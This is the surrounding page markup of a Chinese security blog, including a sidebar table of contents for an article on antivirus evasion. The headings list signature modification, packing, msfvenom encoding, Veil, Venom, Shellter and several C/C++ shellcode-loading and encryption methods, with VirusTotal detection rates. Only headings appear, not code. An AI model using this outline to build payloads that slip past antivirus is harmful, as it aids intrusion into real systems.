data-lazy-src="https://img0.baidu.com/it/u=2009713656,733522492&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-20</div><div class="title">MySQL注入技巧</div></div></a></div><div><a href="/smallhao/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA-DNSLog/" title="平台搭建-DNSLog"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img1.baidu.com/it/u=2960356299,1327658431&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-20</div><div class="title">平台搭建-DNSLog</div></div></a></div><div><a href="/smallhao/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集-敏感信息收集"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img1.baidu.com/it/u=132799049,2544133620&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-20</div><div class="title">信息收集-敏感信息收集</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.smallhao.ddns-ip.net/IMG_6062.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">欢迎大家来到SmallHao日常技术分享Blog，欢迎大家前来评论讨论</div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://img.smallhao.ddns-ip.net/wetchat.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80"><span class="toc-text">内网渗透-免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF%E5%8E%9F%E7%90%86"><span class="toc-text">杀软原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B"><span class="toc-text">静态检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%A3%80%E6%B5%8B"><span class="toc-text">动态检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B"><span class="toc-text">流量检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E6%9F%A5%E6%9D%80"><span class="toc-text">云查杀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E5%8E%9F%E7%90%86"><span class="toc-text">免杀原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80"><span class="toc-text">静态免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%89%B9%E5%BE%81%E7%A0%81"><span class="toc-text">修改特征码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%85%8D%E6%9D%80"><span class="toc-text">花指令免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80"><span class="toc-text">加壳免杀</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%85%8D%E6%9D%80"><span class="toc-text">动态免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#API%E5%85%8D%E6%9D%80"><span class="toc-text">API免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%85%8D%E6%9D%80"><span class="toc-text">内存免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E7%BC%96%E8%AF%91"><span class="toc-text">二次编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="toc-text">分离免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E4%BF%AE%E6%94%B9"><span class="toc-text">资源修改</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6"><span class="toc-text">免杀技术研究</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass%E4%B8%80%E8%A7%88%E8%A1%A8%EF%BC%882020%E5%B9%B4%EF%BC%89"><span class="toc-text">Bypass一览表（2020年）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass%E4%B8%80%E8%A7%88%E8%A1%A8%EF%BC%882022%E5%B9%B4%EF%BC%89"><span class="toc-text">Bypass一览表（2022年）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%EF%BC%882022%E5%B9%B4%EF%BC%89"><span class="toc-text">复现环境（2022年）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E8%87%AA%E5%B8%A6%E5%85%8D%E6%9D%80"><span class="toc-text">Metasploit自带免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E6%80%81payload-VT%E6%9F%A5%E6%9D%80%E7%8E%8751-69"><span class="toc-text">原生态payload(VT查杀率51&#x2F;69)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%87%AA%E7%BC%96%E7%A0%81%E5%85%8D%E6%9D%80-VT%E6%9F%A5%E6%9D%80%E7%8E%8748-67"><span class="toc-text">msf自编码免杀(VT查杀率48&#x2F;67)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%87%AA%E6%8D%86%E7%BB%91%E5%85%8D%E6%9D%80-VT%E6%9F%A5%E6%9D%80%E7%8E%8715-69"><span class="toc-text">msf自捆绑免杀(VT查杀率15&#x2F;69)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%87%AA%E6%8D%86%E7%BB%91-%E7%BC%96%E7%A0%81-VT%E6%9F%A5%E6%9D%80%E7%8E%8716-69"><span class="toc-text">msf自捆绑+编码(VT查杀率16&#x2F;69)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom%E5%A4%9A%E9%87%8D%E7%BC%96%E7%A0%81-VT%E6%9F%A5%E6%9D%80%E7%8E%8728-67"><span class="toc-text">msfvenom多重编码(VT查杀率28&#x2F;67)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-Evasion%E5%85%8D%E6%9D%80"><span class="toc-text">Metasploit Evasion免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90exe-VT%E6%9F%A5%E6%9D%80%E7%8E%8743-69"><span class="toc-text">生成exe(VT查杀率43&#x2F;69)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90hta-VT%E6%9F%A5%E6%9D%80%E7%8E%8714-59"><span class="toc-text">生成hta(VT查杀率14&#x2F;59)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90install-util-VT%E6%9F%A5%E6%9D%80%E7%8E%8733-69"><span class="toc-text">生成install_util(VT查杀率33&#x2F;69)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Veil%E5%85%8D%E6%9D%80"><span class="toc-text">Veil免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Veil"><span class="toc-text">安装Veil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8veil%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90exe-VT%E6%9F%A5%E6%9D%80%E7%8E%8744-69"><span class="toc-text">使用veil直接生成exe(VT查杀率44&#x2F;69)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8veil-mingw-w64-VT%E6%9F%A5%E6%9D%80%E7%8E%8711-69"><span class="toc-text">使用veil+mingw-w64(VT查杀率11&#x2F;69)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Venom%E5%85%8D%E6%9D%80"><span class="toc-text">Venom免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Venom"><span class="toc-text">安装Venom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#venom%E7%94%9F%E6%88%90exe-VT%E6%9F%A5%E6%9D%80%E7%8E%8735-68"><span class="toc-text">venom生成exe(VT查杀率35&#x2F;68)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#venom%E7%94%9F%E6%88%90dll-VT%E6%9F%A5%E6%9D%80%E7%8E%8711-70"><span class="toc-text">venom生成dll(VT查杀率11&#x2F;70)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellter%E5%85%8D%E6%9D%80"><span class="toc-text">Shellter免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Shellter"><span class="toc-text">安装Shellter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90payload%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%877-69"><span class="toc-text">生成payload（VT免杀率7&#x2F;69)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C%E3%80%81C-%E5%8A%A0%E8%BD%BDshellcode"><span class="toc-text">C、C++加载shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-msf%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90exe%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%8751-69%EF%BC%89"><span class="toc-text">方法1 msf直接生成exe（VT免杀率51&#x2F;69）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%8736-69%EF%BC%89"><span class="toc-text">方法2 申请动态内存加载（VT免杀率36&#x2F;69）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%953-%E5%B5%8C%E5%85%A5%E6%B1%87%E7%BC%96%E5%8A%A0%E8%BD%BD%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%8736-69%EF%BC%89"><span class="toc-text">方法3 嵌入汇编加载（VT免杀率36&#x2F;69）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%954-%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%8734-68%EF%BC%89"><span class="toc-text">方法4 强制类型转换（VT免杀率34&#x2F;68）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%955-%E6%B1%87%E7%BC%96%E8%8A%B1%E6%8C%87%E4%BB%A4-VT%E5%85%8D%E6%9D%80%E7%8E%8737-69"><span class="toc-text">方法5 汇编花指令(VT免杀率37&#x2F;69)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%956-xor%E5%8A%A0%E5%AF%86%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%8721-69%EF%BC%89"><span class="toc-text">方法6 xor加密（VT免杀率21&#x2F;69）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%957-base64%E5%8A%A0%E5%AF%861%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%8721-68%EF%BC%89"><span class="toc-text">方法7 base64加密1（VT免杀率21&#x2F;68）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%958-base64%E5%8A%A0%E5%AF%862%EF%BC%88VT%E5%85%8D%E6%9D%80%E7%8E%8717-67%EF%BC%89"><span class="toc-text">方法8 base64加密2（VT免杀率17&#x2F;67）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/smallhao/BurpSuite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%BA%8C%EF%BC%89/" title="BurpSuite使用介绍（二）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img0.baidu.com/it/u=2676346236,2715621986&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1200&amp;h=800" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BurpSuite使用介绍（二）"/></a><div class="content"><a class="title" href="/smallhao/BurpSuite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%BA%8C%EF%BC%89/" title="BurpSuite使用介绍（二）">BurpSuite使用介绍（二）</a><time datetime="2025-03-22T14:33:19.785Z" title="发表于 2025-03-22 14:33:19">2025-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/smallhao/Suite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%B8%80%EF%BC%89/" title="Burp Suite使用介绍（一）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img0.baidu.com/it/u=2259429094,2069555&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1422&amp;h=800" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Burp Suite使用介绍（一）"/></a><div class="content"><a class="title" href="/smallhao/Suite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%B8%80%EF%BC%89/" title="Burp Suite使用介绍（一）">Burp Suite使用介绍（一）</a><time datetime="2025-03-20T15:02:02.000Z" title="发表于 2025-03-20 15:02:02">2025-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/smallhao/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" title="MySQL注入技巧"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img0.baidu.com/it/u=2009713656,733522492&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1422&amp;h=800" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MySQL注入技巧"/></a><div class="content"><a class="title" href="/smallhao/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" title="MySQL注入技巧">MySQL注入技巧</a><time datetime="2025-03-20T02:43:02.000Z" title="发表于 2025-03-20 02:43:02">2025-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/" title="内网渗透-免杀"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img1.baidu.com/it/u=877727430,37580436&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=667" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透-免杀"/></a><div class="content"><a class="title" href="/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/" title="内网渗透-免杀">内网渗透-免杀</a><time datetime="2025-03-20T02:41:30.000Z" title="发表于 2025-03-20 02:41:30">2025-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/smallhao/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA-DNSLog/" title="平台搭建-DNSLog"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img1.baidu.com/it/u=2960356299,1327658431&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1422&amp;h=800" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="平台搭建-DNSLog"/></a><div class="content"><a class="title" href="/smallhao/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA-DNSLog/" title="平台搭建-DNSLog">平台搭建-DNSLog</a><time datetime="2025-03-20T02:40:11.000Z" title="发表于 2025-03-20 02:40:11">2025-03-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2025 By <a class="footer-bar-link" href="/" title="SmallHao" target="_blank">SmallHao</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">1</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.smallhao168.us.kg/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.smallhao.ddns-ip.net/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/zhangyangshijia1/" title="SmallHao开源项目"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.smallhao.ddns-ip.net/favicon.ico" alt="SmallHao开源项目"/><span class="back-menu-item-text">SmallHao开源项目</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 列表</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 免责声明</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/%E7%94%A8%E6%88%B7%E5%8D%8F%E8%AE%AE/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 免责声明</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/%E8%BD%AC%E8%BD%BD%E9%A1%BB%E7%9F%A5/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 转载须知</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 留言板</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">攻防知识<sup>6</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("03/21/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
